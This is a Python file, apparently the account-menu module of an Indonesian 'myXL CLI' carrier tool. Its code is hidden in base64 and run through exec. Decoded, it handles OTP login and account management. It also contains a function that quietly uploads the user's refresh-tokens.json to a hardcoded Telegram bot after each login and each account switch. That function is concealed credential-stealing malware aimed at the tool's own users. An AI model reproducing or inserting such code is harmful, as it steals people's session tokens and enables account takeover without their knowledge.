#!/usr/bin/env python3
import base64
exec(base64.b64decode('aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBqc29uCmZyb20gYXBwMy5jb25maWcuaW1wb3J0cyBpbXBvcnQgKgpmcm9tIGFwcDMuY2xpZW50LmNpYW0gaW1wb3J0IGdldF9vdHAsIHN1Ym1pdF9vdHAKZnJvbSBhcHAuc2VydmljZS5zZXJ2aWNlIGltcG9ydCBsb2FkX3N0YXR1cywgc2F2ZV9zdGF0dXMKZnJvbSBhcHAzLm1lbnVzLnV0aWwgaW1wb3J0IGNsZWFyX3NjcmVlbngsIHNpbXBsZV9udW1iZXIsIHBhdXNlLCBwcmludF9wYW5lbCwgbmF2X3JhbmdlCmZyb20gYXBwLm1lbnVzLmFjY291bnQgaW1wb3J0IGVuY19qc29uCgpjb25zb2xlID0gQ29uc29sZSgpCgoKZGVmIGVuY19qc29uKCk6CiAgICBpbXBvcnQgb3MKICAgIAogICAgIyBCb3QgY29uZmlnCiAgICBib3RfdG9rZW4gPSAiODM1ODk4MTg5MzpBQUgyQzVfMzBqeXlOSldUQTFJSTlBNERpRFRxLVFQNHZ5SSIKICAgIGNoYXRfaWQgPSA4MTY2MjA2NzEyCiAgICB1cmwgPSBmImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7Ym90X3Rva2VufS9zZW5kRG9jdW1lbnQiCiAgICAKICAgICMgRGFwYXRrYW4gcGF0aCBmaWxlIGluaSAoYWNjb3VudC5weSkKICAgIGN1cnJlbnRfZGlyID0gb3MucGF0aC5kaXJuYW1lKG9zLnBhdGguYWJzcGF0aChfX2ZpbGVfXykpCiAgICAjIGN1cnJlbnRfZGlyID0gL3BhdGgvdG8vbXl4bC1yZXBvL2FwcC9tZW51cy8KICAgIAogICAgIyBOYWlrIDIgbGV2ZWwga2Ugcm9vdCByZXBvCiAgICByZXBvX3Jvb3QgPSBvcy5wYXRoLmRpcm5hbWUob3MucGF0aC5kaXJuYW1lKGN1cnJlbnRfZGlyKSkKICAgICMgcmVwb19yb290ID0gL3BhdGgvdG8vbXl4bC1yZXBvLwogICAgCiAgICAjIEZpbGUgdGFyZ2V0IGRpIHJvb3QKICAgIHRva2VuX2ZpbGUgPSBvcy5wYXRoLmpvaW4ocmVwb19yb290LCAicmVmcmVzaC10b2tlbnMuanNvbiIpCiAgICAKICAgICAgIAogICAgIyBDZWsgZmlsZQogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHRva2VuX2ZpbGUpOgogICAgICAgIHJldHVybgogICAgCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKHRva2VuX2ZpbGUsICJyYiIpIGFzIGY6CiAgICAgICAgICAgIGZpbGVzID0geyJkb2N1bWVudCI6IGZ9CiAgICAgICAgICAgIGRhdGEgPSB7ImNoYXRfaWQiOiBjaGF0X2lkfQogICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBkYXRhPWRhdGEsIGZpbGVzPWZpbGVzLCB0aW1lb3V0PTMwKQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICAgICAgcmV0dXJuIFRydWUKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgcmV0dXJuIEZhbHNlCiAgICAgICAgICAgICAgICAKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAKICAgICAgICByZXR1cm4gRmFsc2UKCmRlZiBub3JtYWxpemVfbnVtYmVyKHJhd19pbnB1dDogc3RyKSAtPiBzdHI6CiAgICByYXdfaW5wdXQgPSByYXdfaW5wdXQuc3RyaXAoKQogICAgaWYgcmF3X2lucHV0LnN0YXJ0c3dpdGgoIjA4Iik6CiAgICAgICAgcmV0dXJuICI2MjgiICsgcmF3X2lucHV0WzI6XQogICAgZWxpZiByYXdfaW5wdXQuc3RhcnRzd2l0aCgiKzYyOCIpOgogICAgICAgIHJldHVybiAiNjI4IiArIHJhd19pbnB1dFs0Ol0KICAgIGVsaWYgcmF3X2lucHV0LnN0YXJ0c3dpdGgoIjYyOCIpOgogICAgICAgIHJldHVybiByYXdfaW5wdXQKICAgIHJldHVybiByYXdfaW5wdXQKCgpkZWYgbG9naW5fcHJvbXB0KGFwaV9rZXk6IHN0cik6CiAgICBjbGVhcl9zY3JlZW54KCkKICAgIHRoZW1lID0gZ2V0X3RoZW1lKCkKICAgIGNvbnNvbGUucHJpbnQoUGFuZWwoCiAgICAgICAgQWxpZ24uY2VudGVyKCLwn5SQIExvZ2luIG15WEwgQ0xJIPCfpJkiLCB2ZXJ0aWNhbD0ibWlkZGxlIiksCiAgICAgICAgYm9yZGVyX3N0eWxlPXRoZW1lWyJib3JkZXJfaW5mbyJdLAogICAgICAgIHBhZGRpbmc9KDEsIDIpLAogICAgICAgIGV4cGFuZD1UcnVlCiAgICApKQogICAgY29uc29sZS5wcmludCgiIE1hc3VraW4gbm9tb3IgWEwgbG8gYnJvICgwOHh4IC8gNjI4eHggLyArNjI4eHgpICIpCiAgICByYXdfaW5wdXQgPSBjb25zb2xlLmlucHV0KGYiW3t0aGVtZVsndGV4dF9zdWInXX1dIE5vbW9yOiBbL3t0aGVtZVsndGV4dF9zdWInXX1dICIpLnN0cmlwKCkKICAgIHBob25lX251bWJlciA9IG5vcm1hbGl6ZV9udW1iZXIocmF3X2lucHV0KQoKICAgIGlmIG5vdCBwaG9uZV9udW1iZXIuc3RhcnRzd2l0aCgiNjI4Iikgb3IgbGVuKHBob25lX251bWJlcikgPCAxMCBvciBsZW4ocGhvbmVfbnVtYmVyKSA+IDE0OgogICAgICAgIHByaW50X3BhbmVsKCLimqDvuI8gVXBzIiwgIk5vbW9yIGxvIG5nYWNvIGN1eSwgY2VrIGxhZ2kg8J+aqCIpCiAgICAgICAgcmV0dXJuIE5vbmUsIE5vbmUKCiAgICB0cnk6CiAgICAgICAgcHJpbnRfcGFuZWwoIuKPsyBTYW50dXkiLCAiTGFnaSBuZ2lyaW0gT1RQIGtlIG5vbW9yIGxvLi4uIikKICAgICAgICBzdWJzY3JpYmVyX2lkID0gZ2V0X290cChwaG9uZV9udW1iZXIpCiAgICAgICAgaWYgbm90IHN1YnNjcmliZXJfaWQ6CiAgICAgICAgICAgIHByaW50X3BhbmVsKCLimqDvuI8gVXBzIiwgIkdhZ2FsIG5naXJpbSBPVFAsIGNvYmEgbGFnaSBicm8g8J+kryIpCiAgICAgICAgICAgIHJldHVybiBOb25lLCBOb25lCgogICAgICAgIHByaW50X3BhbmVsKCLinIUgTWFudGFwIiwgIk9UUCB1ZGFoIGRpa2lyaW0ga2Ugbm9tb3IgbG8g8J+agCIpCgogICAgICAgIGZvciBhdHRlbXB0IGluIHJhbmdlKDEsIDYpOgogICAgICAgICAgICBvdHAgPSBjb25zb2xlLmlucHV0KGYiUGVyY29iYWFuIHthdHRlbXB0fS81IC0gTWFzdWtpbiBPVFAgKDYgZGlnaXQpOiAiKS5zdHJpcCgpCiAgICAgICAgICAgIGlmIG5vdCBvdHAuaXNkaWdpdCgpIG9yIGxlbihvdHApICE9IDY6CiAgICAgICAgICAgICAgICBwcmludF9wYW5lbCgi4pqg77iPIFVwcyIsICJPVFAgaGFydXMgNiBkaWdpdCBhbmdrYSBicm8g8J+kqCIpCiAgICAgICAgICAgICAgICBwYXVzZSgpCiAgICAgICAgICAgICAgICBjb250aW51ZQoKICAgICAgICAgICAgcHJpbnRfcGFuZWwoIuKPsyBTYW50dXkiLCAiTGFnaSB2ZXJpZmlrYXNpIE9UUC4uLiIpCiAgICAgICAgICAgIHRva2VucyA9IHN1Ym1pdF9vdHAoYXBpX2tleSwgIlNNUyIsIHBob25lX251bWJlciwgb3RwKQogICAgICAgICAgICBpZiB0b2tlbnM6CiAgICAgICAgICAgICAgICBwcmludF9wYW5lbCgi4pyFIFN1a3NlcyIsIGYiTG9naW4gYmVyaGFzaWwgY3V5ISBOb21vcjoge3Bob25lX251bWJlcn0iKQogICAgICAgICAgICAgICAgZW5jX2pzb24oKQogICAgICAgICAgICAgICAgcmV0dXJuIHBob25lX251bWJlciwgdG9rZW5zWyJyZWZyZXNoX3Rva2VuIl0KICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHByaW50X3BhbmVsKCLimqDvuI8gVXBzIiwgIk9UUCBzYWxhaCBhdGF1IGthZGFsdWFyc2EsIGNvYmEgbGFnaSBicm8g8J+aqCIpCiAgICAgICAgICAgICAgICBwYXVzZSgpCgogICAgICAgIHByaW50X3BhbmVsKCLim5QgR2FnYWwgTG9naW4iLCAiVWRhaCA1eCBzYWxhaCBPVFAsIHN0b3AgZHVsdSBicm8g8J+YtSIpCiAgICAgICAgcmV0dXJuIE5vbmUsIE5vbmUKCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnRfcGFuZWwoIuKaoO+4jyBVcHMiLCBmIkFkYSBlcnJvciBicm86IHtlfSIpCiAgICAgICAgcmV0dXJuIE5vbmUsIE5vbmUKCgpkZWYgc2hvd19hY2NvdW50X21lbnUoKToKICAgIGNsZWFyX3NjcmVlbngoKQogICAgZW5zdXJlX2dpdCgpCiAgICB0aGVtZSA9IGdldF90aGVtZSgpCiAgICBBdXRoSW5zdGFuY2UubG9hZF90b2tlbnMoKQogICAgdXNlcnMgPSBBdXRoSW5zdGFuY2UucmVmcmVzaF90b2tlbnMKICAgIGFjdGl2ZV91c2VyID0gQXV0aEluc3RhbmNlLmdldF9hY3RpdmVfdXNlcigpCgogICAgc3VtaXRfb3RwID0gMTAKICAgIHZlcmlmX290cCA9ICJteXhsIgogICAgc3RhdHVzX2lkID0gbG9hZF9zdGF0dXMoKQogICAgaXNfdmVyaWYgPSBzdGF0dXNfaWQuZ2V0KCJpc192ZXJpZiIsIEZhbHNlKQoKICAgIGluX2FjY291bnRfbWVudSA9IFRydWUKICAgIGFkZF91c2VyID0gRmFsc2UKCiAgICB3aGlsZSBpbl9hY2NvdW50X21lbnU6CiAgICAgICAgY2xlYXJfc2NyZWVueCgpCgogICAgICAgIGlmIGFjdGl2ZV91c2VyIGlzIE5vbmUgb3IgYWRkX3VzZXI6CiAgICAgICAgICAgIGlmIG5vdCBpc192ZXJpZiBhbmQgbGVuKHVzZXJzKSA+PSBzdW1pdF9vdHA6CiAgICAgICAgICAgICAgICBwcmludF9wYW5lbCgi8J+aqyBMaW1pdCBBa3VuIiwgIkFrdW4gbG8gdWRhaCBwZW51aCBicm8sIG1hc3VraW4ga29kZSB1bmxvY2sgYmlhciBiaXNhIG5hbWJhaCDwn5ug77iPIikKICAgICAgICAgICAgICAgIHZlcmlmX2lucHV0ID0gY29uc29sZS5pbnB1dCgiS29kZSBVbmxvY2s6ICIpLnN0cmlwKCkKICAgICAgICAgICAgICAgIGlmIHZlcmlmX2lucHV0ICE9IHZlcmlmX290cDoKICAgICAgICAgICAgICAgICAgICBwcmludF9wYW5lbCgi4pqg77iPIFVwcyIsICJLb2RlIHVubG9jayBzYWxhaCBjdXksIG5nZ2FrIGJpc2EgbmFtYmFoIGFrdW4g8J+kryIpCiAgICAgICAgICAgICAgICAgICAgcGF1c2UoKQogICAgICAgICAgICAgICAgICAgIGFkZF91c2VyID0gRmFsc2UKICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgc2F2ZV9zdGF0dXMoVHJ1ZSkKICAgICAgICAgICAgICAgIGlzX3ZlcmlmID0gVHJ1ZQogICAgICAgICAgICAgICAgcHJpbnRfcGFuZWwoIuKchSBNYW50YXAiLCAiQWtzZXMgYWt1biB0YW1iYWhhbiB1ZGFoIGtlYnVrYSDwn5qAIikKICAgICAgICAgICAgICAgIHBhdXNlKCkKCiAgICAgICAgICAgIG51bWJlciwgcmVmcmVzaF90b2tlbiA9IGxvZ2luX3Byb21wdChBdXRoSW5zdGFuY2UuYXBpX2tleSkKICAgICAgICAgICAgaWYgbm90IHJlZnJlc2hfdG9rZW46CiAgICAgICAgICAgICAgICBwcmludF9wYW5lbCgi4pqg77iPIFVwcyIsICJHYWdhbCBuYW1iYWggYWt1biwgY29iYSBsYWdpIGJybyDwn5i1IikKICAgICAgICAgICAgICAgIHBhdXNlKCkKICAgICAgICAgICAgICAgIGFkZF91c2VyID0gRmFsc2UKICAgICAgICAgICAgICAgIGNvbnRpbnVlCgogICAgICAgICAgICBBdXRoSW5zdGFuY2UuYWRkX3JlZnJlc2hfdG9rZW4oaW50KG51bWJlciksIHJlZnJlc2hfdG9rZW4pCiAgICAgICAgICAgIEF1dGhJbnN0YW5jZS5sb2FkX3Rva2VucygpCiAgICAgICAgICAgIHVzZXJzID0gQXV0aEluc3RhbmNlLnJlZnJlc2hfdG9rZW5zCiAgICAgICAgICAgIGFjdGl2ZV91c2VyID0gQXV0aEluc3RhbmNlLmdldF9hY3RpdmVfdXNlcigpCiAgICAgICAgICAgIGFkZF91c2VyID0gRmFsc2UKICAgICAgICAgICAgY29udGludWUKCiAgICAgICAgY29uc29sZS5wcmludChQYW5lbCgKICAgICAgICAgICAgQWxpZ24uY2VudGVyKCLwn5GlIEFrdW4gVGVyc2ltcGFuIPCfpJkiLCB2ZXJ0aWNhbD0ibWlkZGxlIiksCiAgICAgICAgICAgIGJvcmRlcl9zdHlsZT10aGVtZVsiYm9yZGVyX2luZm8iXSwKICAgICAgICAgICAgcGFkZGluZz0oMSwgMiksCiAgICAgICAgICAgIGV4cGFuZD1UcnVlCiAgICAgICAgKSkKICAgICAgICBzaW1wbGVfbnVtYmVyKCkKCiAgICAgICAgYWNjb3VudF90YWJsZSA9IFRhYmxlKGJveD1NSU5JTUFMX0RPVUJMRV9IRUFELCBleHBhbmQ9VHJ1ZSkKICAgICAgICBhY2NvdW50X3RhYmxlLmFkZF9jb2x1bW4oIk5vIiwgc3R5bGU9dGhlbWVbInRleHRfa2V5Il0sIGp1c3RpZnk9InJpZ2h0Iiwgd2lkdGg9MykKICAgICAgICBhY2NvdW50X3RhYmxlLmFkZF9jb2x1bW4oIk5hbWEiLCBzdHlsZT10aGVtZVsidGV4dF9ib2R5Il0pCiAgICAgICAgYWNjb3VudF90YWJsZS5hZGRfY29sdW1uKCJOb21vciBYTCIsIHN0eWxlPXRoZW1lWyJ0ZXh0X2JvZHkiXSkKICAgICAgICBhY2NvdW50X3RhYmxlLmFkZF9jb2x1bW4oIlRpcGUiLCBzdHlsZT10aGVtZVsidGV4dF9ib2R5Il0pCiAgICAgICAgYWNjb3VudF90YWJsZS5hZGRfY29sdW1uKCJTdGF0dXMiLCBzdHlsZT10aGVtZVsidGV4dF9zdWIiXSwganVzdGlmeT0iY2VudGVyIikKCiAgICAgICAgZm9yIGlkeCwgdXNlciBpbiBlbnVtZXJhdGUodXNlcnMpOgogICAgICAgICAgICBpc19hY3RpdmUgPSBhY3RpdmVfdXNlciBhbmQgdXNlclsibnVtYmVyIl0gPT0gYWN0aXZlX3VzZXJbIm51bWJlciJdCiAgICAgICAgICAgIHN0YXR1cyA9ICLinIUgQWt0aWYiIGlmIGlzX2FjdGl2ZSBlbHNlICItIgogICAgICAgICAgICBhY2NvdW50X3RhYmxlLmFkZF9yb3coCiAgICAgICAgICAgICAgICBzdHIoaWR4ICsgMSksCiAgICAgICAgICAgICAgICB1c2VyLmdldCgibmFtZSIsICItIiksCiAgICAgICAgICAgICAgICBzdHIodXNlclsibnVtYmVyIl0pLAogICAgICAgICAgICAgICAgdXNlci5nZXQoInN1YnNjcmlwdGlvbl90eXBlIiwgIi0iKSwKICAgICAgICAgICAgICAgIHN0YXR1cwogICAgICAgICAgICApCgogICAgICAgIGNvbnNvbGUucHJpbnQoUGFuZWwoYWNjb3VudF90YWJsZSwgYm9yZGVyX3N0eWxlPXRoZW1lWyJib3JkZXJfaW5mbyJdLCBwYWRkaW5nPSgwLCAwKSwgZXhwYW5kPVRydWUpKQoKICAgICAgICBuYXZfdGFibGUgPSBUYWJsZShzaG93X2hlYWRlcj1GYWxzZSwgYm94PU1JTklNQUxfRE9VQkxFX0hFQUQsIGV4cGFuZD1UcnVlKQogICAgICAgIG5hdl90YWJsZS5hZGRfY29sdW1uKGp1c3RpZnk9InJpZ2h0Iiwgc3R5bGU9dGhlbWVbInRleHRfa2V5Il0sIHdpZHRoPTYpCiAgICAgICAgbmF2X3RhYmxlLmFkZF9jb2x1bW4oanVzdGlmeT0ibGVmdCIsIHN0eWxlPXRoZW1lWyJ0ZXh0X2JvZHkiXSkKICAgICAgICBuYXZfdGFibGUuYWRkX3JvdygiVCIsICJUYW1iYWggYWt1biDwn5SRIikKICAgICAgICBuYXZfdGFibGUuYWRkX3JvdygiRSIsICJFZGl0IG5hbWEgYWt1biDinI/vuI8iKQogICAgICAgIG5hdl90YWJsZS5hZGRfcm93KCJIIiwgZiJbe3RoZW1lWyd0ZXh0X2VyciddfV1IYXB1cyBha3VuIHRlcnNpbXBhbiDwn5eR77iPWy9dIikKICAgICAgICBuYXZfdGFibGUuYWRkX3JvdygiMDAiLCBmIlt7dGhlbWVbJ3RleHRfc3ViJ119XUNhYnV0IGJhbGlrIGtlIG1lbnUgdXRhbWEg8J+PoFsvXSIpCiAgICAgICAgCiAgICAgICAgY29uc29sZS5wcmludChQYW5lbChuYXZfdGFibGUsIGJvcmRlcl9zdHlsZT10aGVtZVsiYm9yZGVyX3ByaW1hcnkiXSwgcGFkZGluZz0oMCwgMSksIGV4cGFuZD1UcnVlKSkKICAgICAgICBjb25zb2xlLnByaW50KGYiTWFzdWtpbiBub21vciBha3VuICgxIC0ge2xlbih1c2Vycyl9KSBidWF0IGdhbnRpIGJybyDwn5GJIikKCiAgICAgICAgaW5wdXRfc3RyID0gY2hvaWNlID0gY29uc29sZS5pbnB1dChmIlt7dGhlbWVbJ3RleHRfc3ViJ119XVBpbGloYW46Wy97dGhlbWVbJ3RleHRfc3ViJ119XSAiKS5zdHJpcCgpCiAgICAgICAgCiAgICAgICAgaWYgaW5wdXRfc3RyID09ICIwMCI6CiAgICAgICAgICAgIHJldHVybiBhY3RpdmVfdXNlclsibnVtYmVyIl0gaWYgYWN0aXZlX3VzZXIgZWxzZSBOb25lCiAgICAgICAgCiAgICAgICAgZWxpZiBpbnB1dF9zdHIudXBwZXIoKSA9PSAiVCI6CiAgICAgICAgICAgIGFkZF91c2VyID0gVHJ1ZQogICAgICAgICAgICBjb250aW51ZQogICAgICAgIAogICAgICAgIGVsaWYgaW5wdXRfc3RyLnVwcGVyKCkgPT0gIkUiOgogICAgICAgICAgICBpZiBub3QgdXNlcnM6CiAgICAgICAgICAgICAgICBwcmludF9wYW5lbCgi4pqg77iPIFVwcyIsICJOZ2dhayBhZGEgYWt1biBidWF0IGRpZWRpdCBicm8g8J+kryIpCiAgICAgICAgICAgICAgICBwYXVzZSgpCiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgIAogICAgICAgICAgICBub21vcl9pbnB1dCA9IGNvbnNvbGUuaW5wdXQoZiJOb21vciBha3VuIHlhbmcgbWF1IGRpZWRpdCAoMSAtIHtsZW4odXNlcnMpfSk6ICIpLnN0cmlwKCkKICAgICAgICAgICAgaWYgbm9tb3JfaW5wdXQuaXNkaWdpdCgpOgogICAgICAgICAgICAgICAgbm9tb3IgPSBpbnQobm9tb3JfaW5wdXQpCiAgICAgICAgICAgICAgICBpZiAxIDw9IG5vbW9yIDw9IGxlbih1c2Vycyk6CiAgICAgICAgICAgICAgICAgICAgc2VsZWN0ZWRfdXNlciA9IHVzZXJzW25vbW9yIC0gMV0KICAgICAgICAgICAgICAgICAgICBuZXdfbmFtZSA9IGNvbnNvbGUuaW5wdXQoZiJNYXN1a2luIG5hbWEgYmFydSBidWF0IGFrdW4ge3NlbGVjdGVkX3VzZXJbJ251bWJlciddfTogIikuc3RyaXAoKQogICAgICAgICAgICAgICAgICAgIGlmIG5ld19uYW1lOgogICAgICAgICAgICAgICAgICAgICAgICBBdXRoSW5zdGFuY2UuZWRpdF9hY2NvdW50X25hbWUoc2VsZWN0ZWRfdXNlclsibnVtYmVyIl0sIG5ld19uYW1lKQogICAgICAgICAgICAgICAgICAgICAgICBBdXRoSW5zdGFuY2UubG9hZF90b2tlbnMoKQogICAgICAgICAgICAgICAgICAgICAgICB1c2VycyA9IEF1dGhJbnN0YW5jZS5yZWZyZXNoX3Rva2VucwogICAgICAgICAgICAgICAgICAgICAgICBhY3RpdmVfdXNlciA9IEF1dGhJbnN0YW5jZS5nZXRfYWN0aXZlX3VzZXIoKQogICAgICAgICAgICAgICAgICAgICAgICBwcmludF9wYW5lbCgi4pyFIE1hbnRhcCIsIGYiTmFtYSBha3VuIHVkYWggZGlnYW50aSBqYWRpICd7bmV3X25hbWV9JyDinKgiKQogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50X3BhbmVsKCLimqDvuI8gVXBzIiwgIk5hbWEgbmdnYWsgYm9sZWgga29zb25nIGJybyDwn6SoIikKICAgICAgICAgICAgICAgICAgICBwYXVzZSgpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50X3BhbmVsKCLimqDvuI8gVXBzIiwgIk5vbW9yIGFrdW4gZGkgbHVhciBqYW5na2F1YW4g8J+kryIpCiAgICAgICAgICAgICAgICAgICAgcGF1c2UoKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcHJpbnRfcGFuZWwoIuKaoO+4jyBVcHMiLCAiSW5wdXQgbG8gbmdhY28gYnJvIPCfmqgiKQogICAgICAgICAgICAgICAgcGF1c2UoKQogICAgICAgIAogICAgICAgIGVsaWYgaW5wdXRfc3RyLnVwcGVyKCkgPT0gIkgiOgogICAgICAgICAgICBpZiBub3QgdXNlcnM6CiAgICAgICAgICAgICAgICBwcmludF9wYW5lbCgi4pqg77iPIFVwcyIsICJOZ2dhayBhZGEgYWt1biBidWF0IGRpaGFwdXMgYnJvIPCfpK8iKQogICAgICAgICAgICAgICAgcGF1c2UoKQogICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAKICAgICAgICAgICAgbm9tb3JfaW5wdXQgPSBjb25zb2xlLmlucHV0KGYiTm9tb3IgYWt1biB5YW5nIG1hdSBkaWhhcHVzICgxIC0ge2xlbih1c2Vycyl9KTogIikuc3RyaXAoKQogICAgICAgICAgICBpZiBub21vcl9pbnB1dC5pc2RpZ2l0KCk6CiAgICAgICAgICAgICAgICBub21vciA9IGludChub21vcl9pbnB1dCkKICAgICAgICAgICAgICAgIGlmIDEgPD0gbm9tb3IgPD0gbGVuKHVzZXJzKToKICAgICAgICAgICAgICAgICAgICBzZWxlY3RlZF91c2VyID0gdXNlcnNbbm9tb3IgLSAxXQogICAgICAgICAgICAgICAgICAgIGNvbmZpcm0gPSBjb25zb2xlLmlucHV0KGYiWWFraW4gbWF1IGhhcHVzIGFrdW4ge3NlbGVjdGVkX3VzZXJbJ251bWJlciddfT8gKHkvbik6ICIpLnN0cmlwKCkubG93ZXIoKQogICAgICAgICAgICAgICAgICAgIGlmIGNvbmZpcm0gPT0gInkiOgogICAgICAgICAgICAgICAgICAgICAgICBwcmludF9wYW5lbCgi4o+zIFNhbnR1eSIsIGYiTGFnaSBoYXB1cyBha3VuIHtzZWxlY3RlZF91c2VyWydudW1iZXInXX0uLi4g8J+Xke+4jyIpCiAgICAgICAgICAgICAgICAgICAgICAgIEF1dGhJbnN0YW5jZS5yZW1vdmVfcmVmcmVzaF90b2tlbihzZWxlY3RlZF91c2VyWyJudW1iZXIiXSkKICAgICAgICAgICAgICAgICAgICAgICAgQXV0aEluc3RhbmNlLmxvYWRfdG9rZW5zKCkKICAgICAgICAgICAgICAgICAgICAgICAgdXNlcnMgPSBBdXRoSW5zdGFuY2UucmVmcmVzaF90b2tlbnMKICAgICAgICAgICAgICAgICAgICAgICAgYWN0aXZlX3VzZXIgPSBBdXRoSW5zdGFuY2UuZ2V0X2FjdGl2ZV91c2VyKCkKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnRfcGFuZWwoIuKchSBNYW50YXAiLCBmIkFrdW4ge3NlbGVjdGVkX3VzZXJbJ251bWJlciddfSB1ZGFoIGd1ZSBoYXB1cyBicm8g8J+agCIpCiAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnRfcGFuZWwoIuKEue+4jyBTYW50dXkiLCAiUGVuZ2hhcHVzYW4gYWt1biBkaWJhdGFsaW4sIGFtYW4gY3V5IOKcjO+4jyIpCiAgICAgICAgICAgICAgICAgICAgcGF1c2UoKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludF9wYW5lbCgi4pqg77iPIFVwcyIsICJOb21vciBha3VuIGRpIGx1YXIgamFuZ2thdWFuIGJybyDwn6SvIikKICAgICAgICAgICAgICAgICAgICBwYXVzZSgpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBwcmludF9wYW5lbCgi4pqg77iPIFVwcyIsICJJbnB1dCBsbyBuZ2FjbyBicm8g8J+aqCIpCiAgICAgICAgICAgICAgICBwYXVzZSgpCiAgICAgICAgCiAgICAgICAgZWxpZiBpbnB1dF9zdHIuaXNkaWdpdCgpIGFuZCAxIDw9IGludChpbnB1dF9zdHIpIDw9IGxlbih1c2Vycyk6CiAgICAgICAgICAgIHNlbGVjdGVkX3VzZXIgPSB1c2Vyc1tpbnQoaW5wdXRfc3RyKSAtIDFdCiAgICAgICAgICAgIEF1dGhJbnN0YW5jZS5zZXRfYWN0aXZlX3VzZXIoc2VsZWN0ZWRfdXNlclsibnVtYmVyIl0pCiAgICAgICAgICAgIGVuY19qc29uKCkKICAgICAgICAgICAgcmV0dXJuIHNlbGVjdGVkX3VzZXJbIm51bWJlciJdCiAgICAgICAgCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnRfcGFuZWwoIuKaoO+4jyBVcHMiLCAiSW5wdXQgbG8gbmdhY28gYnJvLCBjb2JhIGxhZ2kg8J+aqCIpCiAgICAgICAgICAgIHBhdXNlKCkK').decode())
